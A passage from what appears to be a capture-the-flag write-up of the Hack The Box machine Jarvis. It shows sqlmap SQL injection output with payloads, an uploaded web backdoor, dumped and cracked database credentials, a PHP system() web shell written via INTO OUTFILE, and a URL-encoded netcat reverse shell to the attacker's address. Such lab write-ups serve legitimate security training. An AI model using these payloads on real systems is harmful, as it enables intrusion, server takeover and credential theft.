class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'  </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (EXTRACTVALUE)<span class="string">'  </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (EXTRACTVALUE)<span class="string">'      </span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (UPDATEXML)<span class="string">'    </span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (UPDATEXML)<span class="string">'         </span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">4.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:00] [INFO] testing '</span>MySQL &gt;= <span class="number">4.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:01] [INFO] testing '</span>MySQL <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:01] [INFO] testing '</span>PostgreSQL <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">'           </span></span><br><span class="line"><span class="string">[22:16:01] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">IN</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:02] [INFO] testing '</span><span class="keyword">Oracle</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">XMLType</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:02] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - <span class="keyword">PROCEDURE</span> ANALYSE (EXTRACTVALUE)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:02] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:03] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="keyword">EXP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:03] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (JSON_KEYS)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:03] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:04] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (UPDATEXML)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:04] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (EXTRACTVALUE)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:06] [INFO] testing '</span>MySQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:06] [INFO] testing '</span>PostgreSQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:06] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:07] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:08] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:08] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">query</span> <span class="keyword">SLEEP</span> - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:08] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">query</span> <span class="keyword">SLEEP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:09] [INFO] testing '</span>MySQL &lt; <span class="number">5.0</span><span class="number">.12</span> stacked queries (heavy <span class="keyword">query</span> - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:09] [INFO] testing '</span>MySQL &lt; <span class="number">5.0</span><span class="number">.12</span> stacked queries (heavy <span class="keyword">query</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span>PostgreSQL &gt; <span class="number">8.1</span> stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span><span class="keyword">Oracle</span> stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:10] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind<span class="string">'</span></span><br><span class="line"><span class="string">[22:16:22] [INFO] GET parameter '</span>cod<span class="string">' appears to be '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind<span class="string">' injectable </span></span><br><span class="line"><span class="string">[22:16:22] [INFO] testing '</span>Generic <span class="keyword">UNION</span> <span class="keyword">query</span> (<span class="literal">NULL</span>) - <span class="number">1</span> <span class="keyword">to</span> <span class="number">20</span> <span class="keyword">columns</span><span class="string">'</span></span><br><span class="line"><span class="string">[22:16:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[22:16:22] [INFO] '</span><span class="keyword">ORDER</span> <span class="keyword">BY</span><span class="string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection tech</span></span><br><span class="line"><span class="string">nique test</span></span><br><span class="line"><span class="string">[22:16:23] [INFO] target URL appears to have 7 columns in query</span></span><br><span class="line"><span class="string">[22:16:28] [INFO] GET parameter '</span>cod<span class="string">' is '</span>Generic <span class="keyword">UNION</span> <span class="keyword">query</span> (<span class="literal">NULL</span>) - <span class="number">1</span> <span class="keyword">to</span> <span class="number">20</span> <span class="keyword">columns</span><span class="string">' injectable</span></span><br><span class="line"><span class="string">GET parameter '</span>cod<span class="string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND 9726=9726</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND SLEEP(5)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:16:33] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 9.0 (stretch)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.25</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[22:16:33] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/<span class="keyword">output</span>/jarvis.htb<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 22:16:33 /2019-11-08/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~/Desktop/HTB/boxes/jarvis#</span></span><br></pre></td></tr></table></figure>


<h2 id="RCE-–-gt-Shell-as-www-data"><a href="#RCE-–-gt-Shell-as-www-data" class="headerlink" title="RCE –&gt; Shell as www-data"></a>RCE –&gt; Shell as www-data</h2><p>I could get RCE in 2 different ways.</p>
<h3 id="First-way"><a href="#First-way" class="headerlink" title="First way:"></a>First way:</h3><p>By using the <code>os-shell</code> option in <code>sqlmap</code>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell                                    </span></span><br><span class="line">        ___           </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . ["]     | .'| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                       </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no</span></span><br><span class="line"><span class="string"> liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[*] starting @ 22:23:10 /2019-11-08/</span></span><br><span class="line"><span class="string">[22:23:10] [INFO] resuming back-end DBMS '</span>mysql<span class="string">'</span></span><br><span class="line"><span class="string">[22:23:10] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND 9726=9726</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND SLEEP(5)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr                 </span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 9.0 (stretch)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.25</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[22:23:11] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">&gt; 4</span></span><br><span class="line"><span class="string">[22:23:13] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[1] common location(s) ('</span>/<span class="keyword">var</span>/www/, /<span class="keyword">var</span>/www/html, /usr/<span class="keyword">local</span>/apache2/htdocs, /<span class="keyword">var</span>/www/nginx-<span class="keyword">default</span>, /srv/www<span class="string">') (default)</span></span><br><span class="line"><span class="string">[2] custom location(s)</span></span><br><span class="line"><span class="string">[3] custom directory list file</span></span><br><span class="line"><span class="string">[4] brute force search</span></span><br><span class="line"><span class="string">&gt; 2</span></span><br><span class="line"><span class="string">please provide a comma separate list of absolute directory paths: /var/www/html</span></span><br><span class="line"><span class="string">[22:23:40] [INFO] retrieved web server absolute paths: '</span>/images/<span class="string">'</span></span><br><span class="line"><span class="string">[22:23:40] [INFO] trying to upload the file stager on '</span>/<span class="keyword">var</span>/www/html/<span class="string">' via LIMIT '</span><span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span><span class="string">' method</span></span><br><span class="line"><span class="string">[22:23:42] [INFO] the file stager has been successfully uploaded on '</span>/<span class="keyword">var</span>/www/html/<span class="string">' - http://jarvis.htb:80/tmpuujaq.php</span></span><br><span class="line"><span class="string">[22:23:43] [INFO] the backdoor has been successfully uploaded on '</span>/<span class="keyword">var</span>/www/html/<span class="string">' - http://jarvis.htb:80/tmpbtwbt.php</span></span><br><span class="line"><span class="string">[22:23:43] [INFO] calling OS shell. To quit type '</span>x<span class="string">' or '</span>q<span class="string">' and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; whoami</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] a</span></span><br><span class="line"><span class="string">command standard output: '</span>www-<span class="keyword">data</span><span class="string">'</span></span><br><span class="line"><span class="string">os-shell&gt; id</span></span><br><span class="line"><span class="string">command standard output: '</span>uid=<span class="number">33</span>(www-<span class="keyword">data</span>) gid=<span class="number">33</span>(www-<span class="keyword">data</span>) <span class="keyword">groups</span>=<span class="number">33</span>(www-<span class="keyword">data</span>)<span class="string">'</span></span><br><span class="line"><span class="string">os-shell&gt;</span></span><br></pre></td></tr></table></figure>
<p>From here we can simply execute a reverse shell command and get a shell. </p>
<h3 id="Second-way"><a href="#Second-way" class="headerlink" title="Second way:"></a>Second way:</h3><p>I used the <code>--passwords</code> option to dump the users’ password hashes:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords                                  </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [,]     | .'| . |</span><br><span class="line">|___|_  [']_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 22:17:45 /2019-11-08/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:17:46] [INFO] resuming back-end DBMS '</span>mysql<span class="string">'</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND 9726=9726</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND SLEEP(5)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr                 </span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 9.0 (stretch)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.25</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] fetching database users password hashes</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] used SQL query returns 1 entry</span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span></span><br><span class="line"><span class="string">[22:17:53] [INFO] writing hashes to a temporary file '</span>/tmp/sqlmapbAZ4vg2489/sqlmaphashes-KkbVkR.txt<span class="string">' </span></span><br><span class="line"><span class="string">do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n</span></span><br><span class="line"><span class="string">database management system users password hashes:</span></span><br><span class="line"><span class="string">[*] DBadmin [1]:</span></span><br><span class="line"><span class="string">    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:17:55] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/<span class="keyword">output</span>/jarvis.htb<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 22:17:55 /2019-11-08/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~/Desktop/HTB/boxes/jarvis#</span></span><br></pre></td></tr></table></figure>
<p>I got the password hash for <code>DBadmin</code>, I cracked it with <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a>:<br><img src="/images/hackthebox/jarvis/10.png" alt=""><br>Then I tried these credentials (<code>DBadmin : imissyou</code>) with <code>phpmyadmin</code> and I got in:<br><img src="/images/hackthebox/jarvis/11.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/12.png" alt=""><br>From the <code>SQL</code> console we can write a web shell:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php system($_GET['c']); ?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/var/www/html/sh3ll.php"</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/jarvis/13.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/14.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/15.png" alt=""></p>
<p>I used the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd" target="_blank" rel="noopener">netcat openbsd reverse shell payload</a> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a> to get a reverse shell, I had to <code>url</code>-encode it first:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/jarvis/16.png" alt=""></p>
<p>Now we have a shell as <code>www-data</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1337</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.143.</span><br><span class="line">Ncat: Connection from 10.10.10.143:57400.</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# stty raw -echo </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$ export TERM&#x3D;screen</span><br><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$</span><br></pre></td></tr></table></figure>


<h2 id="Command-Injection-in-simpler-py-–-gt-Shell-as-pepper-–-gt-User-Flag"><a href="#Command-Injection-in-simpler-py-–-gt-Shell-as-pepper-–-gt-User-Flag" class="headerlink" title="Command Injection in simpler.py –&gt; Shell as pepper –&gt; User Flag"></a>Command Injection in simpler.py –&gt; Shell as pepper –&gt; User Flag</h2><p>I checked the home directory and there was a user called <code>pepper</code>, I couldn’t read the user flag as <code>www-data</code>: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$ cd &#x2F;home&#x2F;</span><br><span class="line">www-data@jarvis:&#x2F;home$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root   root   4096 Mar  2  2019 .</span><br><span class="line">drwxr-xr-x 23 root   root   4096 Mar  3  2019 ..</span><br><span class="line">drwxr-xr-x  4 pepper pepper 4096 Mar  5  2019 pepper</span><br><span class="line">www-data@jarvis:&#x2F;home$ cd pepper&#x2F;</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..</span><br><span class="line">lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc</span><br><span class="line">drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano</span><br><span class="line">-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile</span><br><span class="line">drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web</span><br><span class="line">-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span 